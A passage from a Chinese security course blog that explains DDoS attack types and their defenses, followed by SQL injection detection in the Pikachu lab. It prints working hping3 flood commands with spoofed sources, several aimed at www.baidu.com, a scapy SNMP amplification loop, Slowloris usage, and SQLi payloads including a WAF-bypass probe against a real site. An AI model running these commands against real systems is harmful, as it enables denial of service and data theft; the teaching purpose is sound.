<h4 id="测试工具-1"><a href="#测试工具-1" class="headerlink" title="测试工具"></a>测试工具</h4><p>使用Kali hping3进行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo hping3 -1 -a 192.168.1.100 -c 10000 192.168.1.255</span><br><span class="line"></span><br><span class="line">-l：使用ICMP协议</span><br><span class="line">-a：伪造的受害者IP地址</span><br><span class="line">-c：发送的请求次数</span><br><span class="line">192.168.1.255：本网段的广播地址</span><br></pre></td></tr></table></figure>



<h3 id="Ping-of-Death"><a href="#Ping-of-Death" class="headerlink" title="Ping of Death"></a>Ping of Death</h3><h4 id="攻击介绍-2"><a href="#攻击介绍-2" class="headerlink" title="攻击介绍"></a>攻击介绍</h4><p><strong>1、介绍</strong></p>
<p>​	Ping of Death：又称为死亡之ping，通过大量的畸形ICMP请求包</p>
<p><strong>2、攻击原理</strong></p>
<p>​	这种攻击通过发送大于65536字节的ICMP包使操作系统崩溃；通常不可能发送大于65536个字节的ICMP包，但可以把报文分割成片段，然后在目标主机上重组；最终会导致被攻击目标缓冲区溢出，引起拒绝服务攻击。有些时候导致telnet和http服务停止，有些时候路由器重启。</p>
<p><strong>3、适用版本</strong></p>
<ol>
<li><strong>Windows 系统：</strong><ul>
<li>Windows 95</li>
<li>Windows 98</li>
<li>Windows ME</li>
<li>Windows NT 4.0（未打补丁的版本）</li>
</ul>
</li>
<li><strong>Linux 系统：</strong><ul>
<li>早期的 Linux 内核版本（2.0及更早版本）</li>
<li>某些未修补的嵌入式 Linux 系统</li>
</ul>
</li>
<li><strong>Unix 系统：</strong><ul>
<li>BSD&#x2F;OS（某些版本）</li>
<li>早期的 Solaris 和 HP-UX 版本</li>
</ul>
</li>
</ol>
<h4 id="测试方法"><a href="#测试方法" class="headerlink" title="测试方法"></a>测试方法</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ping -l 65500 192.168.2.1 -t</span><br></pre></td></tr></table></figure>

<h3 id="UDP-Flood攻击"><a href="#UDP-Flood攻击" class="headerlink" title="UDP Flood攻击"></a>UDP Flood攻击</h3><h4 id="攻击介绍-3"><a href="#攻击介绍-3" class="headerlink" title="攻击介绍"></a>攻击介绍</h4><p><strong>1、介绍</strong></p>
<p>​	向攻击者向受害者发送大量的UDP数据包，造成受害者服务器卡顿、负载提示、网络卡顿等问题</p>
<p><strong>2、攻击原理</strong></p>
<p>​	在短时间内 <strong>模拟随机的源端口地址向随机的目的端口发送大量的udp包，造成目标主机不能处理其他udp的请求</strong></p>
<p><strong>3、防御方法</strong></p>
<p>​	UDP是无状态连接协议，常用于僵尸网络的DDOS攻击，比起TCP来说更难防御。通过设置防火墙，对UDP包的IP，端口，速率可针对性防御。另外，UDP Flood除了消耗受害者资源，也会消耗大量攻击者资源。</p>
<h4 id="测试方法-1"><a href="#测试方法-1" class="headerlink" title="测试方法"></a>测试方法</h4><p>1、使用hping3 进行测试</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hping3 -c 10000 -d 120 --udp -w 64 -p 80 --flood --rand-source www.baidu.com</span><br><span class="line"></span><br><span class="line">--udp：使用udp进行攻击</span><br><span class="line">-p：指定攻击的端口</span><br><span class="line">-c：请求次数</span><br><span class="line">-d：发送的数据包大小</span><br><span class="line">-w：窗口大小</span><br><span class="line">--flood：尽最快发送数据包，不显示回复</span><br><span class="line">--rand-source：产生随机源端口</span><br></pre></td></tr></table></figure>



<h2 id="连接型攻击"><a href="#连接型攻击" class="headerlink" title="连接型攻击"></a>连接型攻击</h2><h3 id="TCP-Flood攻击"><a href="#TCP-Flood攻击" class="headerlink" title="TCP Flood攻击"></a>TCP Flood攻击</h3><h4 id="攻击介绍-4"><a href="#攻击介绍-4" class="headerlink" title="攻击介绍"></a>攻击介绍</h4><p>1、介绍：</p>
<p>了解TCP Flood攻击需要先了解TCP的三次握手机制：</p>
<p><img src="/img/oldboy/z9yrv9cbz3.png" alt="img"></p>
<ol>
<li>客户端向服务都发送一个SYN包，用来请求与服务器建立连接</li>
<li>服务器收到SYN包，回复一个SYN+ACK包，用于表示可以与客户端建立连接</li>
<li>客户端收到服务器发送的SYN+ACK包，向服务器发送ACK，表示连接状态建立</li>
</ol>
<p>TCP Flood攻击：利用了这种会话建立机制，大量向服务端发送SYN请求包请求建立连接，收到SYN+ACK包后，不会发送ACK包，导致服务器一直占用会话耗尽服务器资源。</p>
<h4 id="渗透方法"><a href="#渗透方法" class="headerlink" title="渗透方法"></a>渗透方法</h4><p>SYN ddos攻击：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hping3 -c 10000 -d 120 -S -w 64 -p 80 --flood --rand-source www.baidu.com</span><br><span class="line"></span><br><span class="line">-c：发送的请求数量</span><br><span class="line">-d：发送到攻击方的数据包大小</span><br><span class="line">-S：只发送SYN包</span><br><span class="line">-w：指定窗口大小</span><br><span class="line">-p：指定攻击的窗口，可以使用任意端口</span><br><span class="line">--flood：尽量快速的发送</span><br><span class="line">--rand-source：源ip随机产生</span><br></pre></td></tr></table></figure>









<h3 id="ACK洪水攻击"><a href="#ACK洪水攻击" class="headerlink" title="ACK洪水攻击"></a>ACK洪水攻击</h3><h4 id="攻击介绍-5"><a href="#攻击介绍-5" class="headerlink" title="攻击介绍"></a>攻击介绍</h4><p><strong>1、介绍</strong></p>
<p>​	ACK洪水攻击：实在TCP建立完连接之后，攻击者将所有传输的TCP数据包都带有ACK标志位的数据包。</p>
<p><strong>2、原理</strong></p>
<p>​	接收端在收到一个带有ACK标志位的数据包的时候，需要检查该数据包所表示的连接<a href="https://zhida.zhihu.com/search?content_id=163715515&content_type=Article&match_order=1&q=%E5%9B%9B%E5%85%83%E7%BB%84&zhida_source=entity">四元组</a>是否存在，如果存在则检查该数据包所表示的状态是否合法，然后再向应用层传递该数据包。</p>
<p>​	如在检查中发现数据包不合法，如所指向的目的端口未开放，则操作系统<a href="https://zhida.zhihu.com/search?content_id=163715515&content_type=Article&match_order=1&q=%E5%8D%8F%E8%AE%AE%E6%A0%88&zhida_source=entity">协议栈</a>会回应RST包告诉对方此端口不存在。</p>
<p><strong>此时服务器要做两个动作，查表和回应ack&#x2F;rst。</strong></p>
<p>​	对攻击者来说发送带有ACK标志位的TCP数据包消耗小；</p>
<p>​	但对于服务器进行查表动作时，所消耗的资源大于攻击者发送数据包的消耗</p>
<p><img src="/img/oldboy/v2-10d27a4b6b6f0ce0a82d0e9217a08ec1_1440w.jpg" alt="img"></p>
<p><strong>3、防御方法</strong></p>
<p>抗D设备基于目的地址对ack报文速率进行统计，当ack报文速率超过阈值启动源认证防御。</p>
<h4 id="测试方法-2"><a href="#测试方法-2" class="headerlink" title="测试方法"></a>测试方法</h4><p>ACK ddos攻击：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hping3 -c 10000 -d 120 -A -w 64 -p 80 --flood --rand-source www.baidu.com</span><br><span class="line"></span><br><span class="line">-c：发送的请求数量</span><br><span class="line">-d：发送到攻击方的数据包大小</span><br><span class="line">-A：参数用于设置 TCP 包头中的 ACK（确认，Acknowledgment）标志。ACK 标志用于表示该包是一个确认包，通常用于 TCP 协议中确认接收到数据。</span><br><span class="line">-w：指定窗口大小</span><br><span class="line">-p：指定攻击的窗口，可以使用任意端口</span><br><span class="line">--flood：尽量快速的发送</span><br><span class="line">--rand-source：源ip随机产生</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="WebSocket攻击"><a href="#WebSocket攻击" class="headerlink" title="WebSocket攻击"></a><strong>WebSocket攻击</strong></h3><h4 id="攻击介绍-6"><a href="#攻击介绍-6" class="headerlink" title="攻击介绍"></a>攻击介绍</h4><p><strong>1、websocket介绍</strong></p>
<p>​	WebSocket是通过HTTP协议发起的一个双向<a href="https://so.csdn.net/so/search?q=%E5%85%A8%E5%8F%8C%E5%B7%A5&spm=1001.2101.3001.7020">全双工</a>的通信协议。WebSocket协议被广泛用在现代WEB程序中用于数据流的传输和异步通信。</p>
<p><strong>2、websocket和http区别</strong></p>
<p>大多数的Web浏览器和Web网站都是使用HTTP协议进行通信的。通过HTTP协议，客户端发送一个HTTP请求，然后服务器返回一个响应。通常来说，服务端返回一个响应后，这个HTTP请求事务就已经完成了。即使这个HTTP连接处于keep-alive的状态，它们之间的每一个工作(事务)依然是请求与响应，请求来了，响应回去了。这个事务就结束了。所以通常来说，HTTP协议是一个基于事务性的通信协议。</p>
<p>而WebSocket呢，它通常是由HTTP请求发起建立的，建立连接后，会始终保持连接状态。客户端和服务端可以随时随地的通过一个WebSocket互发消息，没有所谓事务性的特点。这里要注意了，源于其双向全双工的通信特点，在一个WebSocket连接中，服务端是可以主动发送消息的哦，这一点已经完全区别于HTTP协议了。</p>
<p>因此，基于以上特点，WebSocket通常用于低延迟和允许服务器发送消息的场景。例如，金融行业常用WebSocket来传输实时更新的数据。</p>
<p><strong>3、攻击原理</strong></p>
<ul>
<li>使用WebSocket协议的持久连接，攻击者发送大量数据或保持长连接。</li>
<li>消耗服务器资源，导致正常用户无法访问。</li>
</ul>
<h2 id="特殊协议缺陷型攻击"><a href="#特殊协议缺陷型攻击" class="headerlink" title="特殊协议缺陷型攻击"></a>特殊协议缺陷型攻击</h2><h3 id="Slowloris慢性攻击"><a href="#Slowloris慢性攻击" class="headerlink" title="Slowloris慢性攻击"></a>Slowloris慢性攻击</h3><h4 id="攻击介绍-7"><a href="#攻击介绍-7" class="headerlink" title="攻击介绍"></a>攻击介绍</h4><p><strong>1、介绍</strong></p>
<p>Slowloris 的核心原理是通过建立大量半开的 HTTP 连接，耗尽目标服务器的资源，导致它无法处理合法的请求。它发送部分 [HTTP 请求头](<a href="https://so.csdn.net/so/search?q=HTTP">https://so.csdn.net/so/search?q=HTTP</a> 请求头&amp;spm&#x3D;1001.2101.3001.7020)，但从不完成请求，并定期发送数据保持连接处于活跃状态。这样，目标服务器会持续消耗资源等待完成的请求。<br><strong>2、攻击原理</strong></p>
<p>1.发出大量 HTTP 请求。<br>2.定期（每约 15 秒）发送标头以保持连接打开。<br>3.除非服务器这样做，否则我们永远不会关闭连接。如果服务器关闭一个连接，我们会创建一个新连接，继续做同样的事情。</p>
<p>这会耗尽服务器线程池，并且服务器无法回复其他人。 </p>
<p><strong>3、防范措施</strong></p>
<p>如何防护Slowloris攻击<br>1、提高服务器的客户端连接数量</p>
<p>2、限制传入请求个数：限制单个IP 地址允许建立的最大连接数</p>
<p>3、使用一些DDOS方法安全工具</p>
<p>4、限制HTTP头部传输的最大许可时间：超过指定时间HTTP Header还没有传输完成，直接判定源IP地址为慢速连接攻击，中断连接并加入黑名单。</p>
<h4 id="测试方法-3"><a href="#测试方法-3" class="headerlink" title="测试方法"></a>测试方法</h4><p><a href="https://github.com/gkbrk/slowloris">gkbrk&#x2F;slowloris: Low bandwidth DoS tool. Slowloris rewrite in Python.</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python slowloris.py 192.168.30.158</span><br><span class="line"></span><br><span class="line">positional arguments:</span><br><span class="line">  host                  Host to perform stress test on</span><br><span class="line"></span><br><span class="line">options:</span><br><span class="line">  -h, --help            show this help message and exit</span><br><span class="line">  -p PORT, --port PORT  Port of webserver, usually 80</span><br><span class="line">  -s SOCKETS, --sockets SOCKETS</span><br><span class="line">                        Number of sockets to use in the test</span><br><span class="line">  -v, --verbose         Increases logging</span><br><span class="line">  -ua, --randuseragents</span><br><span class="line">                        Randomizes user-agents with each request</span><br><span class="line">  -x, --useproxy        Use a SOCKS5 proxy for connecting</span><br><span class="line">  --proxy-host PROXY_HOST</span><br><span class="line">                        SOCKS5 proxy host</span><br><span class="line">  --proxy-port PROXY_PORT</span><br><span class="line">                        SOCKS5 proxy port</span><br><span class="line">  --https               Use HTTPS for the requests</span><br><span class="line">  --sleeptime SLEEPTIME</span><br><span class="line">                        Time to sleep between each header sent.</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h3 id="DNS放大攻击"><a href="#DNS放大攻击" class="headerlink" title="DNS放大攻击"></a><strong>DNS放大攻击</strong></h3><h4 id="攻击介绍-8"><a href="#攻击介绍-8" class="headerlink" title="攻击介绍"></a>攻击介绍</h4><p><strong>1、介绍</strong></p>
<p>​	DNS放大攻击：攻击者通过恶意构造udp数据包报头，伪造受害者的IP信息，向DNS服务器发送解析请求，将DNS服务器的响应包引入给受害者服务器。</p>
<p>​	DNS查询通常通过UDP协议发送。UDP是一种“发即忘”协议，这意味着不需要通过握手来验证数据包IP地址的真实性。</p>
<p><strong>2、攻击原理</strong></p>
<p>​	攻击者的dns查询包消耗很小，但返回的响应包数据量很大，所以攻击者伪造受害者IP大量请求DNS解析请求，将查询的大量记录返回给受害者IP造成受害者服务器资源耗尽，服务器宕机。</p>
<p><strong>3、防御措施</strong></p>
<p>限制DNS服务器的递归查询、部署流量清洗设备以及使用DNSSEC协议</p>
<h3 id="SNMP放大攻击"><a href="#SNMP放大攻击" class="headerlink" title="SNMP放大攻击"></a>SNMP放大攻击</h3><h4 id="攻击介绍-9"><a href="#攻击介绍-9" class="headerlink" title="攻击介绍"></a>攻击介绍</h4><p><strong>1、介绍</strong></p>
<p>​	snmp：通过一台客户端机器向一个被管理的设备发出查询请求获取这台设备当前运行状态的检测等情况，网络监控一般是基于SNMP与Agent。</p>
<p>​	在SNMP的服务中，被监控设备端口UDP 161为主动查询请求；162端口为监控方在固定时间内受监控端向监控端自动发送查询请求。<br>同时管理信息数据库MIB是一个信息存储库，包含管理代理中的有关配置和性能的数据，按照不同分类（类似树形图），包含分属不同组的多个数据对象</p>
<p><strong>2、攻击原理</strong></p>
<p>​	利用SNMP协议的请求-响应机制，发送大量SNMP Get请求，伪造源IP。</p>
<p><strong>3、影响危害</strong></p>
<p>​	目标网络因响应数据过多而拥塞。</p>
<p><strong>4、防御方法</strong></p>
<p>​	禁用SNMP或限制其访问，定期更新固件防止漏洞利用。</p>
<h4 id="测试方法-4"><a href="#测试方法-4" class="headerlink" title="测试方法"></a>测试方法</h4><p>1、使用nmap扫描指定的地址端</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sU 192.168.10.1</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">snmp------&gt;</span><span class="language-bash">192.168.10.24</span></span><br></pre></td></tr></table></figure>



<p>2、构建python脚本</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/usr/bin/env python</span></span><br><span class="line">from scapy.all import *</span><br><span class="line">i = IP(dst=&quot;192.168.10.24&quot;,src=&quot;192.168.10.234&quot;)</span><br><span class="line">u = UDP(sport=161,dport=161)</span><br><span class="line">s = SNMP(community=&#x27;public&#x27;)</span><br><span class="line">b = SNMPbulk(max_repetitions=200,varbindlist=[SNMPvarbind(oid=ASN1_OID(&#x27;1.3.6.1.2.1.1&#x27;)),SNMPvarbind(oid=ASN1_OID(&#x27;1.3.6.1.2.1.19.1.3&#x27;))])</span><br><span class="line">s.PDU=b</span><br><span class="line">r = i/u/s</span><br><span class="line">while 1:</span><br><span class="line">	send(r)</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h3 id="HTTP洪水攻击"><a href="#HTTP洪水攻击" class="headerlink" title="HTTP洪水攻击"></a>HTTP洪水攻击</h3><h4 id="攻击介绍-10"><a href="#攻击介绍-10" class="headerlink" title="攻击介绍"></a>攻击介绍</h4><p><strong>1、介绍</strong></p>
<p>​	HTTP洪水攻击： HTTPFlood是一种针对Web服务的第七层攻击，通过模拟正常用户请求消耗服务器资源。</p>
<p><strong>2、攻击原理</strong></p>
<p>​	攻击者通过代理或僵尸主机向目标服务器发起大量的HTTP报文，<strong>请求涉及数据库操作的URI（Universal Resource Identifier）</strong>或其它消耗系统资源的URI，造成服务器资源耗尽，无法响应正常请求。</p>
<p><strong>3、防御方法</strong></p>
<p>HTTP Flood源认证：</p>
<ul>
<li>META刷新：阻止非浏览器客户端的访问，僵尸工具无法通过认证。</li>
<li>验证码认证：通过推送验证码判断HTTP访问是否由真实用户发起，防御效果较好。</li>
<li>302重定向模式：对嵌套资源服务器启动302重定向防御，探测访问源是否为真实浏览器。</li>
</ul>
<p>HTTP源统计：</p>
<p>​	HTTP源统计是在基于目的IP流量异常的基础上，对源IP流量进行统计，判定具体某个源流量异常，并对其进行限速。</p>
<p>动态指纹学习</p>
<p>​	动态指纹学习适用于攻击源访问的URI比较固定的情况。Anti-DDoS设备对源访问的URI进行指纹学习，找到攻击目标URI指纹，如果对该URI指纹的命中次数高于设置的阈值就将该源加入黑名单。</p>
<h4 id="测试方法-5"><a href="#测试方法-5" class="headerlink" title="测试方法"></a>测试方法</h4><p>​	工具：</p>
<p><img src="/img/oldboy/image-20250330103648189.png" alt="image-20250330103648189"></p>
<p><strong>注意 填写的url要与数据库进行交互</strong></p>
<h3 id="CC攻击"><a href="#CC攻击" class="headerlink" title="CC攻击"></a>CC攻击</h3><h4 id="攻击介绍-11"><a href="#攻击介绍-11" class="headerlink" title="攻击介绍"></a><strong>攻击介绍</strong></h4><p><strong>1、介绍</strong></p>
<p>​	CC攻击是一种试图通过使目标系统的资源耗尽来提供拒绝服务的攻击方式。它通常基于建立大量无效的连接或发送大量恶意请求，超过目标系统的处理能力，从而导致系统崩溃或无法正常工作。CC攻击通常由单台计算机或少量机器发起。</p>
<p><strong>2、原理</strong></p>
<p>​	CC攻击通常运用于通过攻击种子服务器（Seed Server）发出大量伪造的请求或连接来骚扰目标系统。这种攻击通常通过模拟大量用户访问（如使用恶意脚本或利用漏洞）来获取目标系统的资源。攻击者还可以使用代理服务器、TOR网络等技术来隐藏自己的身份和位置。</p>
<p><strong>3、与DDOS的区别</strong></p>
<p>​	规模和资源使用：CC攻击通常是相对较小规模的攻击，通常仅由一台计算机或几台计算机发起，资源使用相对较少。DDoS攻击则是通过使用分布在全球范围内的多台计算机，协同合作发起大规模攻击，消耗更多的网络资源和带宽。</p>
<p>​	攻击方式：CC攻击的目标是耗尽目标系统的资源，通过建立大量的无效连接或发送恶意请求来实现。DDoS攻击则在通过大量流量发送来超出目标系统的处理能力，让系统无法正常运行。</p>
<p>​	攻击协同性：CC攻击通常由单台计算机或少量机器发起，攻击者的目标是通过耗尽目标资源来实现拒绝服务。DDoS攻击则涉及到多个攻击端（发起者），它们可以同时从多个方面攻击目标系统，通过协调行动提高攻击效果。</p>
<p><strong>4、CC攻击防御</strong>：</p>
<ul>
<li>限制连接请求的速率</li>
<li>使用验证码</li>
<li>检测和封锁代理服务器</li>
<li>监测网络流量，识别异常行为，使用入侵检测系统和防火墙</li>
</ul>
<h4 id="测试方法-6"><a href="#测试方法-6" class="headerlink" title="测试方法"></a>测试方法</h4><p>使用安防cc进行测试</p>
<p><img src="/img/oldboy/image-20250330104933122.png" alt="image-20250330104933122"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>​	<strong>以上就是相关DDOS的知识总结，欢迎和博主进行技术交流VX：GoldY_66</strong></p>
]]></content>
      <categories>
        <category>网络安全</category>
        <category>老男孩安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>老男孩安全</tag>
      </tags>
  </entry>
  <entry>
    <title>老男孩--Web十大常规漏洞(2)</title>
    <url>/posts/caf167a2.html</url>
    <content><![CDATA[<h1 id="SQL注入漏洞"><a href="#SQL注入漏洞" class="headerlink" title="SQL注入漏洞"></a>SQL注入漏洞</h1><h2 id="注入概念"><a href="#注入概念" class="headerlink" title="注入概念"></a>注入概念</h2><p><strong>1.1.1 什么是注入漏洞（SQL）</strong></p>
<p>​	接收相关参数未经过处理直接带入数据库查询操作</p>
<p>具备的两个关键点：</p>
<ul>
<li>用户能够控制输入（网站交互操作）</li>
<li>原本程序接受了用户输入的信息，并且直接执行（没有做过滤）</li>
</ul>
<p><strong>1.1.2 SQL注入漏洞的分类&#x2F;特点</strong></p>
<p>​	服务端漏洞（数据库服务-代码有逻辑问题）</p>
<p>​	与操作系统、数据库类型、脚本语言类型无关</p>
<p><strong>1.1.3 SQL漏洞产生原理</strong></p>
<p>​	代码中没有对用户的传入参数信息，做处理</p>
<p><strong>1.1.4 SQL注入的目的</strong></p>
<ul>
<li>窃取数据信息</li>
<li>修改数据信息</li>
<li>破坏数据信息</li>
</ul>
<p>1.1.5 SQL注入攻击流程：</p>
<ol>
<li>获取攻击网站域名（子域名）</li>
<li>获取攻击网站注入点</li>
<li>获取网站业务数据库名称</li>
<li>获取网站业务数据表名称</li>
<li>获取网站业务表字段信息</li>
<li>获取网站业务真实数据（SQL注入目的：窃取数据）<ol>
<li>利用联合注入获取数据信息（配合order by获取字段数）</li>
</ol>
</li>
<li>实现篡改或破坏数据 （堆叠注入）</li>
</ol>
<h2 id="漏洞点查找"><a href="#漏洞点查找" class="headerlink" title="漏洞点查找"></a>漏洞点查找</h2><p><strong>SQL漏洞点获取</strong></p>
<ul>
<li>登录的地方、更新的地方、注册的地方、留言板、查询、删除等</li>
<li>HTTP Header:<ul>
<li>UA：用户指纹信息 chrome – 加载到数据库<ul>
<li>UA指纹信息存储，可以用于判断是否存在盗号行为</li>
</ul>
</li>
<li>cookie：用户登录信息</li>
<li>referer：记录上一个页面的地址，常用于推广记录流量信息</li>
</ul>
</li>
<li>与数据库交互的相关页面<ul>
<li><a href="http://www./*/*.com//*/*.asp?id=xx">http://www.\*\*.com/\*\*.asp?id=xx</a>	 (ASP注入)</li>
<li><a href="http://www./*/*.com//*/*.php?id=xx">http://www.\*\*.com/\*\*.php?id=xx</a>	(PHP注入)</li>
<li><a href="http://www./*/*.com//*/*.jsp?id=xx">http://www.\*\*.com/\*\*.jsp?id=xx</a>	  (JSP注入)</li>
</ul>
</li>
</ul>
<p>举例：pikachu靶场注册用户案例</p>
<p>访问：<a href="http://192.168.138.130:90/pikachu/vul/sqli/sqli_iu/sqli_reg.php#">Get the pikachu</a></p>
<ol>
<li>在提交注册前，进行请求包抓取</li>
<li>在burp suit中请求包发送到重发器</li>
<li>修改请求主体信息，加单引号</li>
<li>利用报错函数信息，获取数据库表名称</li>
</ol>
<p>	</p>
<p>伪静态如何实现SQL注入漏洞：</p>
<blockquote>
<p>伪静态：一般是中间件加载了伪静态插件代码，其实不是真正的静态页面</p>
</blockquote>
<p>伪静态例：</p>
<p>​	<a href="https://www.oldboyedu.com/zuixin_wenzhang/index/id/523">https://www.oldboyedu.com/zuixin_wenzhang/index/id/523</a></p>
<p>&#x3D;&#x3D;&#x3D; <a href="https://www.oldboyedu.com/zuixin_wenzhang/index?id=523">https://www.oldboyedu.com/zuixin_wenzhang/index?id=523</a></p>
<p>验证方式</p>
<p>​	<a href="https://www.oldboyedu.com/zuixin_wenzhang/index/id/523">https://www.oldboyedu.com/zuixin_wenzhang/index/id/523</a></p>
<p>​	<a href="https://www.oldboyedu.com/zuixin_wenzhang/index/id/523/%20/%26/%26/%20-1=-2">https://www.oldboyedu.com/zuixin_wenzhang/index/id/523\%20\%26\%26\%20-1=-2</a></p>
<p>注意：该网站配置了WAF防火墙，需要通过URL编码的方式进行绕过，因为对and进行了过滤，即使用&amp;&amp;进行代替</p>
<h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p><strong>检测SQL漏洞</strong></p>
<p>根据有没有回显分为报错注入和盲注两种方式</p>
<h3 id="通过错误信息获取漏洞信息"><a href="#通过错误信息获取漏洞信息" class="headerlink" title="通过错误信息获取漏洞信息"></a>通过错误信息获取漏洞信息</h3><p>​	id&#x3D;1 and 1&#x3D;1	&#x3D;&#x3D;&gt;	select * from user where id&#x3D;1 and 1&#x3D;1 ;	—-成功-真</p>
<p>​	id&#x3D;1 and 1&#x3D;2	&#x3D;&#x3D;&gt;	select * from user where id&#x3D;1 and 1&#x3D;2 ;	—-失败-假</p>
<p>&#x3D;&#x3D;&#x3D;&gt; 执行结果不一致，存在漏洞（使用单引号也可以）</p>
<p>针对不同代码实现漏洞绕过：</p>
<ul>
<li>geekgold’ or 1&#x3D;1 – 	(针对asp代码的sql漏洞)</li>
<li>geekgold’ or 1&#x3D;1 #            (针对php代码的sql漏洞)</li>
</ul>
<p>规避SQL注入漏洞，需要对用户传入的信息做处理</p>
<h3 id="通过盲注的方式获取漏洞信息"><a href="#通过盲注的方式获取漏洞信息" class="headerlink" title="通过盲注的方式获取漏洞信息"></a>通过盲注的方式获取漏洞信息</h3><p><strong>1.3.2.1 基于布尔逻辑的盲注检测</strong></p>
<p>方法：通过构造布尔条件（如-1&#x3D;-1或-1&#x3D;-2）来观察浏览器的响应是否有变化</p>
<p>示例：		</p>
<ul>
<li>正常请求：<code>http://example.com/page?id=1</code></li>
<li>盲注测试：<code>http://example.com/page?id=1 AND 1=1</code></li>
<li>盲注测试：<code>http://example.com/page?id=1 AND 1=2</code></li>
</ul>
<p>结果：如果<code>1=1</code>时页面正常显示，而<code>1=2</code>时页面显示异常（如空白页面或错误信息），则可能存在盲注漏洞。</p>
<p><strong>1.3.2.2 基于时间函数的盲注检测</strong></p>
<p>方法：通过构造带有时间函数的SQL语句，观察浏览器的响应时间是否有变化</p>
<p>示例：</p>
<ul>
<li>正常请求：<code>http://example.com/page?id=1</code></li>
<li>盲注测试：<code>http://example.com/page?id=1 AND IF(1=1, SLEEP(5), 0)</code></li>
</ul>
<p>结果：如果页面响应时间明显延迟（如5秒），则可能存在盲注漏洞。</p>
<h2 id="漏洞提交方式"><a href="#漏洞提交方式" class="headerlink" title="漏洞提交方式"></a>漏洞提交方式</h2><h3 id="GET-方式进行提交"><a href="#GET-方式进行提交" class="headerlink" title="GET 方式进行提交"></a>GET 方式进行提交</h3><p><strong>GET方式提交通常会在url后有参数赋值的信息</strong></p>
<p>典型页面： <a href="http://192.168.138.130:90/pikachu/vul/sqli/sqli_str.php">http://192.168.138.130:90/pikachu/vul/sqli/sqli_str.php</a></p>
<p><img src="/img/oldboy/1-9.png"></p>
<p>通过bp进行抓包查看：</p>
<p>​	<img src="/img/oldboy/1-10.png"></p>
<p>漏洞验证：<a href="http://192.168.138.130:90/pikachu/vul/sqli/sqli_str.php?name=admin+%5C%27+or+1%5C=1+%5C%23&submit=%5C%EF%BF%BD%5C%EF%BF%BD%5C%EF%BF%BD%5C%EF%BF%BD%5C%EF%BF%BD%5C%EF%BF%BD">http://192.168.138.130:90/pikachu/vul/sqli/sqli_str.php?name=admin+\%27+or+1\%3D1+\%23&amp;submit=\%E6\%9F\%A5\%E8\%AF\%A2</a></p>
<h3 id="POST方式进行提交"><a href="#POST方式进行提交" class="headerlink" title="POST方式进行提交"></a>POST方式进行提交</h3><p><strong>POST方式进行提交：一般情况下用户输入的内容被隐藏起来了，地址栏看不到，需要借助抓包工具进行抓包</strong></p>
<p>典型页面：<a href="http://192.168.138.130:90/pikachu/vul/sqli/sqli_id.php">http://192.168.138.130:90/pikachu/vul/sqli/sqli_id.php</a></p>
<p><img src="/img/oldboy/1-12.png"></p>
<p>通过bp进行抓包查看：</p>
<p><img src="/img/oldboy/1-11.png"></p>
<p>验证漏洞：利用bp重发器（id&#x3D;2’&amp;submit&#x3D;%E6%9F%A5%E8%AF%A2）修改请求主体信息</p>
<h3 id="Cookie方式进行提交"><a href="#Cookie方式进行提交" class="headerlink" title="Cookie方式进行提交"></a>Cookie方式进行提交</h3><p><strong>原理</strong></p>
<p>ASP脚本中的request对象，被用于从用户那里获取信息。</p>
<p>Request对象的使用方法：request.[集合名称]（参数名称）效率低下，容易出错</p>
<p>eg获取从表单中提交的数据时：request.form(“参数名称”)</p>
<p>ASP中规定也可以省略集合名称：request(“参数名称”)，当使用这样的方式获取数据时，ASP规定是按QueryString、Form、Cookies、ServerVariables的顺序来获取数据的。这样，当我们使用request(“参数名称”)方式获取客户端提交的数据，并且没有对使用request.cookies(“参数名称”)方式提交的数据进行过滤时，可能存在Cookie注入</p>
<p>典型页面：<a href="http://192.168.138.130:90/pikachu/vul/sqli/sqli_header/sqli_header_login.php">http://192.168.138.130:90/pikachu/vul/sqli/sqli_header/sqli_header_login.php</a></p>
<p>在http请求头，cookie字段后面，添加SQL注入信息</p>
<p><img src="/img/oldboy/1-17.png"></p>
<h3 id="HEAD方式进行提交"><a href="#HEAD方式进行提交" class="headerlink" title="HEAD方式进行提交"></a>HEAD方式进行提交</h3><p>典型页面：<a href="http://192.168.138.130:90/pikachu/vul/sqli/sqli_header/sqli_header.php">http://192.168.138.130:90/pikachu/vul/sqli/sqli_header/sqli_header.php</a></p>
<p><img src="/img/oldboy/1-14.png"></p>
<p>使用bp抓包</p>
<p><img src="/img/oldboy/1-13.png"></p>
<p>验证方式：通过Bp重发器，在UA后面加入’进行验证</p>
<p><img src="/img/oldboy/1-15.png"></p>
<h2 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h2><h3 id="数字类型"><a href="#数字类型" class="headerlink" title="数字类型"></a>数字类型</h3><p>传入数据库的信息是数值信息</p>
<p>典型页面：<a href="http://192.168.88.128:90/pikachu/vul/sqli/sqli_id.php">http://192.168.88.128:90/pikachu/vul/sqli/sqli_id.php</a></p>
<p> 交互原理：</p>
<p>   $id&#x3D;$_POST[‘id’];</p>
<p>   $query&#x3D;”select username,email from member where id&#x3D;$id”;<br>   id&#x3D;1<br>   select username,email from member where id&#x3D;1;<br>   利用漏洞：会将所有数据信息都展示出来<br>   id&#x3D;1 or 1&#x3D;1</p>
<h3 id="字符类型"><a href="#字符类型" class="headerlink" title="字符类型"></a>字符类型</h3><p>传入数据的信息是字符信息</p>
<p>典型页面：<a href="http://192.168.88.128:90/pikachu/vul/sqli/sqli_str.php">http://192.168.88.128:90/pikachu/vul/sqli/sqli_str.php</a></p>
